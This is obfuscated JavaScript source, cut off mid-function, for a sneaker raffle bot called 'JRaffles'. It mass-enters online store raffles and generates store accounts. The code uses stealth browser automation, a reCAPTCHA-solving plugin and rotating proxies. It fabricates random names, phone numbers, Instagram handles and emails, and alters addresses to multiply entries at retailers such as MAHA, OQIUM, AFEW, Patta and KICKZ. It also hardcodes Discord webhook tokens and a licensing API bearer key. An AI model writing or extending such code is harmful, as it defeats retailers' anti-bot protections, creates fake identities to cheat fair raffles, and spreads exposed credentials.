const { EmbedBuilder: _0x16e5b8 } = require('discord.js');
var _0x517d02 = require('exe');
const { execFile: _0x305bbc } = require('child_process'), _0x15c804 = require('puppeteer-extra'), _0x1fbb4f = require('puppeteer-extra-plugin-recaptcha'), _0x21b95f = require('puppeteer-extra-plugin-stealth'), _0xc5437b = require('chalk'), _0x52fa74 = require('node-bash-title'), _0x582c0f = require('fs'), _0x3bf363 = require('axios'), _0x43feb8 = require('papaparse');
var _0x9decae = require('random-name');
const _0x128d00 = require('request');
var _0x1f5f6f = require('prompt');
const _0x3b1a30 = _0x128d00['jar']();
var _0x5eb805 = {};
const _0x2ec7a4 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x459f74 = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x4680b8 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x155d6e = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x37c46c = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn';
var _0x523f06 = 'https://discord.com/api/webhooks/', _0x310ae4 = '' + _0x523f06 + _0x4680b8, _0xd1db44 = '' + _0x523f06 + _0x155d6e, _0x57a1da = '' + _0x523f06 + _0x2ec7a4, _0x11ec69 = '' + _0x523f06 + _0x459f74, _0xfe9ed6 = '' + _0x523f06 + _0x37c46c;
const _0x2e5907 = JSON['parse'](_0x582c0f['readFileSync']('../package.json', 'utf-8')), _0x3cb81f = _0x2e5907['version'];
var _0x23f754, _0x47660c, _0x353b0d, _0x5eaf1a, _0xf9d3e, _0xc565dd, _0x44a8dd;
const _0x5d272e = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x1749ce = ![];
const _0x3fad0c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x1a5218 = '0123456789';
var _0x2a09b6 = _0x3fad0c['split']('');
const _0x4f537d = require('auto-git-update'), { PageEmittedEvents: _0x527e59 } = require('puppeteer'), { getRandomValues: _0x3a5b68 } = require('crypto'), { resolve: _0x5bfc90 } = require('path'), _0x4dd7aa = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x8da982 = new _0x4f537d(_0x4dd7aa);
async function _0x44089a() {
    _0xf9d3e = _0x582c0f['readdirSync']('../proxies'), _0x5eaf1a = _0x582c0f['readdirSync']('../tasks'), _0x5eb805 = JSON['parse'](_0x582c0f['readFileSync']('../settings.json', 'utf-8')), !_0x5eb805['delay'] && (_0x5eb805['delay'] = 0x2710, _0x582c0f['writeFileSync']('../settings.json', JSON['stringify'](_0x5eb805))), !_0x5eb805['captchaKey'] && (_0x5eb805['captchaKey'] = '', _0x582c0f['writeFileSync']('../settings.json', JSON['stringify'](_0x5eb805))), !_0x5eb805['useRandomProxy'] && (_0x5eb805['useRandomProxy'] = !![], _0x582c0f['writeFileSync']('../settings.json', JSON['stringify'](_0x5eb805))), !_0x5eb805['webhook'] && (_0x5eb805['webhook'] = '', _0x582c0f['writeFileSync']('../settings.json', JSON['stringify'](_0x5eb805))), _0x523f06 = _0x5eb805['webhook'], _0xc565dd = _0x5eb805['licenseKey'];
}
let _0x272afb, _0x2b00a6 = [], _0x2fee6d;
const _0x238216 = _0x119085 => new Promise(_0x227c3c => setTimeout(_0x227c3c, _0x119085));
function _0x5a1b23(_0x5ebbb2, _0x110062) {
    return Math['floor'](Math['random']() * (_0x110062 - _0x5ebbb2 + 0x1) + _0x5ebbb2);
}
async function _0x1975f0(_0x2dae6f) {
    return _0x3bf363['get']('https://api.hyper.co/v4/licenses/' + _0x2dae6f, { 'headers': { 'Authorization': 'Bearer\x20' + _0x5d272e } })['then'](_0x2c88de => _0x2c88de['data'])['catch'](() => null);
}
;
async function _0x32cd54(_0x12f031) {
    console['clear']();
    if (_0x12f031 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x3142e4 = await _0x1f5f6f['get']('License');
        if (_0x3142e4['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x238216(0xbb8), _0x32cd54(_0x12f031);
        _0x12f031 = _0x3142e4['License'], _0x5eb805['licenseKey'] = _0x12f031, _0xc565dd = _0x12f031, _0x582c0f['writeFileSync']('../settings.json', JSON['stringify'](_0x5eb805));
    }
    console['log']('Checking\x20license\x20' + _0xc565dd + '...'), await _0x238216(0x5dc);
    const _0xfbd5c3 = await _0x1975f0(_0x12f031);
    _0x44a8dd = JSON['stringify'](_0xfbd5c3['user']['username'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0xfbd5c3)
        return console['log']('License\x20not\x20found');
    if (!_0xfbd5c3['user'])
        return console['log']('License\x20not\x20bound');
    return _0xfbd5c3['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x1749ce = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x1749ce = ![]);
}
async function _0x18328e() {
    var _0x4672bc = await _0x1f5f6f['get']('Module');
    return console['clear'](), _0x4672bc['Module'];
}
;
async function _0xa5e79f() {
    var _0x23f04c = await _0x1f5f6f['get']('Setting');
    return console['clear'](), _0x23f04c['Setting'];
}
async function _0x245127() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x5c7162 = 0x0; _0x5c7162 < _0x5eaf1a['length']; _0x5c7162++) {
        console['log']('\x20(' + _0x5c7162 + ')\x20' + _0x5eaf1a[_0x5c7162]);
    }
    console['log']('');
    var _0x3673a6 = await _0x1f5f6f['get']('Task');
    if (_0x3673a6['Task'] > _0x5eaf1a['length'] - 0x1 || isNaN(_0x3673a6['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x238216(0x3e8), _0x245127();
    var _0x493763 = _0x582c0f['readFileSync']('../tasks/' + _0x5eaf1a[_0x3673a6['Task']], 'utf-8');
    return _0x353b0d = _0x43feb8['parse'](_0x493763, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0xc5437b['blue'](_0x5eaf1a[_0x3673a6['Task']])), _0x23f754 = _0x5eaf1a[_0x3673a6['Task']], _0x353b0d;
}
async function _0x36faf5() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x22005c = 0x0; _0x22005c < _0xf9d3e['length']; _0x22005c++) {
        console['log']('\x20(' + _0x22005c + ')\x20' + _0xf9d3e[_0x22005c]);
    }
    console['log']('');
    var _0xcdcc32 = await _0x1f5f6f['get']('Proxies');
    if (_0xcdcc32['Proxies'] > _0xf9d3e['length'] - 0x1 || isNaN(_0xcdcc32['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x238216(0x3e8), _0x36faf5();
    var _0x39db06 = _0x582c0f['readFileSync']('../proxies/' + _0xf9d3e[_0xcdcc32['Proxies']], 'utf-8')['split']('\x0a');
    let _0x2e013f = _0x39db06['map']((_0x576890, _0x566ab5) => {
        sanatizeProxy = _0x576890['replace']('\x0d', '');
        if (_0x39db06[_0x566ab5 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x47660c = _0xf9d3e[_0xcdcc32['Proxies']], console['clear'](), _0x2e013f;
}
async function _0x4a8d14() {
    var _0x58f586 = await _0x1f5f6f['get']('Value');
    return console['clear'](), _0x58f586['Value'];
}
async function _0x5535ca(_0x57c62b) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x4d01c4 = 0x0; _0x4d01c4 < _0x57c62b['length']; _0x4d01c4++) {
        console['log']('\x20(' + _0x4d01c4 + ')\x20[' + _0x57c62b[_0x4d01c4]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x4d938e = await _0x1f5f6f['get']('Module');
    return _0x4d938e['Module'];
}
async function _0x17b04c() {
    var _0x3ae700 = await _0x1f5f6f['get']('Password');
    return console['clear'](), _0x3ae700['Password'];
}
;
async function _0x37eabd() {
    var _0x12a207 = await _0x1f5f6f['get']('Links');
    return _0x12a207['Links'];
}
;
async function _0x3274e4() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x1dedb6 = 0x0; _0x1dedb6 < _0x2b00a6['length']; _0x1dedb6++) {
        console['log']('\x20(' + _0x1dedb6 + ')\x20' + _0x2b00a6[_0x1dedb6]);
    }
    ;
    console['log']();
    let _0x2b3ab1 = await _0x1f5f6f['get']('Product');
    return console['clear'](), _0x2b3ab1['Product'];
}
;
function _0x44cc98() {
    var _0x9ad1ff = new Date(Date['now']())['toLocaleTimeString']();
    return _0x9ad1ff;
}
;
const _0x1159f2 = [
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png'
        }]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png'
        }]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'VJnG3d',
                            'custom_source': 'DO8912-101',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'RwHCGb',
                                '$consent_form_version': 0x7c0710,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            }
        ]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png'
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            }
        ]
    },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x4f7227(_0x1e4635, _0x313554) {
    let _0x45071c = { 'headers': { 'content-type': 'application/json' } };
    if (_0x3cb81f != 'devkey') {
        await _0x3bf363['post'](_0x1e4635, _0x313554, _0x45071c);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x5e2a41(_0x44ec8d, _0x29dd9e, _0x3f6263, _0x26991b, _0x1341d2) {
    if (!_0x26991b && _0x3f6263 == 'dev') {
        var _0x1793b6 = new _0x16e5b8()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x29dd9e['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x29dd9e['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x44ec8d['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x5eb805['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x44a8dd,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x44ec8d['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x3cb81f,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x1793b6['data'];
    } else {
        if (_0x26991b && _0x3f6263 == 'dev') {
            var _0x1793b6 = new _0x16e5b8()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x29dd9e['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x44a8dd,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x29dd9e['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x44ec8d['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x5eb805['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x1341d2,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x44ec8d['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x3cb81f,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x1793b6['data'];
        } else {
            if (_0x3f6263 == 'pub') {
                var _0x1793b6 = new _0x16e5b8()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x29dd9e['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x29dd9e['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x44ec8d['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x5eb805['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x44ec8d['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x3cb81f,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x1793b6['data'];
            } else {
                if (_0x3f6263 == 'acc') {
                    var _0x1793b6 = new _0x16e5b8()['setColor']('#282525')['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x29dd9e['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x44a8dd,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x29dd9e['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x5eb805['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x3cb81f,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x1793b6['data'];
                }
            }
        }
    }
}
async function _0x5c2071(_0x1ebb7b, _0x4843c0) {
    var _0x27e623 = _0x1ebb7b[_0x4843c0]['Address1']['split'](''), _0x14f366 = _0x1ebb7b[_0x4843c0]['Address2']['split'](''), _0x151dc7 = _0x1ebb7b[_0x4843c0]['Email']['split']('@');
    for (var _0x312a2e = 0x0; _0x312a2e < _0x27e623['length']; _0x312a2e++) {
        if (_0x27e623[_0x312a2e] == 'X') {
            var _0x23cfc8 = Math['round'](Math['random']() * (_0x3fad0c['length'] - 0x1));
            _0x27e623[_0x312a2e] = _0x2a09b6[_0x23cfc8];
        }
    }
    ;
    for (var _0x312a2e = 0x0; _0x312a2e < _0x14f366['length']; _0x312a2e++) {
        if (_0x14f366[_0x312a2e] == 'X') {
            var _0x23cfc8 = Math['round'](Math['random']() * (_0x3fad0c['length'] - 0x1));
            _0x14f366[_0x312a2e] = _0x2a09b6[_0x23cfc8];
        }
    }
    ;
    _0x1ebb7b[_0x4843c0]['FirstName'] == 'RANDOM' && (_0x1ebb7b[_0x4843c0]['FirstName'] = _0x9decae['first']());
    _0x1ebb7b[_0x4843c0]['LastName'] == 'RANDOM' && (_0x1ebb7b[_0x4843c0]['LastName'] = _0x9decae['last']());
    _0x151dc7[0x0] == 'RANDOM' ? _0x151dc7[0x0] = '' + _0x9decae['first']() + _0x9decae['last']() + '@' : _0x151dc7[0x0] = _0x151dc7[0x0] + '@';
    _0x1ebb7b[_0x4843c0]['Phone'] == 'RANDOM' && (_0x1ebb7b[_0x4843c0]['Phone'] = _0x5a1b23(0x3b9aca00, 0x2540be3ff));
    if (_0x1ebb7b[_0x4843c0]['Follower'] == 'RANDOM') {
        var _0xe94541 = _0x5a1b23(0x1, 0x270f);
        _0x1ebb7b[_0x4843c0]['Follower'] = '' + _0x9decae['first']() + _0x9decae['last']() + _0xe94541;
    }
    _0x1ebb7b[_0x4843c0]['Email'] = _0x151dc7['join'](''), _0x1ebb7b[_0x4843c0]['Address1'] = _0x27e623['join'](''), _0x1ebb7b[_0x4843c0]['Address2'] = _0x14f366['join']('');
    return;
}
;
function _0x4783a9() {
    let _0x4fec24 = proxyFile['split']('\x0a'), _0x2f15b1 = _0x4fec24['map']((_0x2771f1, _0x375566) => {
        sanatizeProxy = _0x2771f1['replace']('\x0d', '');
        if (_0x4fec24[_0x375566 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x2f15b1;
}
;
async function _0x327cf6(_0xe7f10a) {
    var _0xb73965 = _0xe7f10a[0x1]['split'](':');
    const _0x469262 = await _0x15c804['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0xb73965[0x0] + ':' + _0xb73965[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x1fea2b = await _0x469262['newPage']();
        await _0x1fea2b['authenticate']({
            'username': '' + _0xb73965[0x2],
            'password': '' + _0xb73965[0x3]
        }), console['log'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x1fea2b['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1fea2b['setRequestInterception'](!![]), _0x1fea2b['on']('request', _0x3d3b97 => {
            _0x3d3b97['resourceType']() === 'image' || _0x3d3b97['resourceType']() === 'font' || _0x3d3b97['resourceType']() === 'media' ? _0x3d3b97['abort']() : _0x3d3b97['continue']();
        }), await _0x1fea2b['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x1fea2b['waitForTimeout'](0xbb8), await _0x1fea2b['waitForSelector']('.product-card');
        const _0x1faf12 = await _0x1fea2b['$$eval']('a.product-card', _0xa200d4 => {
            return _0xa200d4['map'](_0x26d3ab => _0x26d3ab['href']);
        });
        return _0x2b00a6 = _0x1faf12;
    } catch (_0x18114e) {
        console['log']('\x20' + _0x18114e);
    } finally {
        _0x469262['close'](), console['clear']();
    }
}
;
async function _0xfaf94e(_0x37895a, _0x5f58a8, _0x4f97cc, _0x34ec12, _0x58edf4) {
    await _0x5c2071(_0x34ec12, _0x37895a);
    var _0x5c43b4 = [{
        'type': 'rich',
        'title': 'Succesful\x20OQIUM\x20Entry',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x44a8dd
            },
            {
                'name': 'Size',
                'value': '' + _0x34ec12[_0x37895a]['Size']
            },
            {
                'name': 'Delay',
                'value': '' + _0x5eb805['delay']
            },
            {
                'name': 'Version',
                'value': '' + _0x3cb81f
            }
        ]
    }];
    const _0x4da30c = { 'embeds': _0x5c43b4 };
    if (_0x5eb805['useRandomProxy'] = ![])
        var _0x2987e1 = _0x58edf4[_0x37895a]['split'](':');
    else
        var _0x46ff7e = Math['round'](Math['random']() * (_0x58edf4['length'] - 0x1)), _0x2987e1 = _0x58edf4[_0x46ff7e]['split'](':');
    var _0x35c6c4 = _0x4f97cc['data'];
    _0x5f58a8 == 'exp' ? _0x35c6c4['data']['attributes']['email'] = '' + _0x34ec12[_0x37895a]['FirstName'] + _0x34ec12[_0x37895a]['LastName'] + _0x5eb805['catchall'] : _0x35c6c4['data']['attributes']['email'] = '' + _0x34ec12[_0x37895a]['Email'];
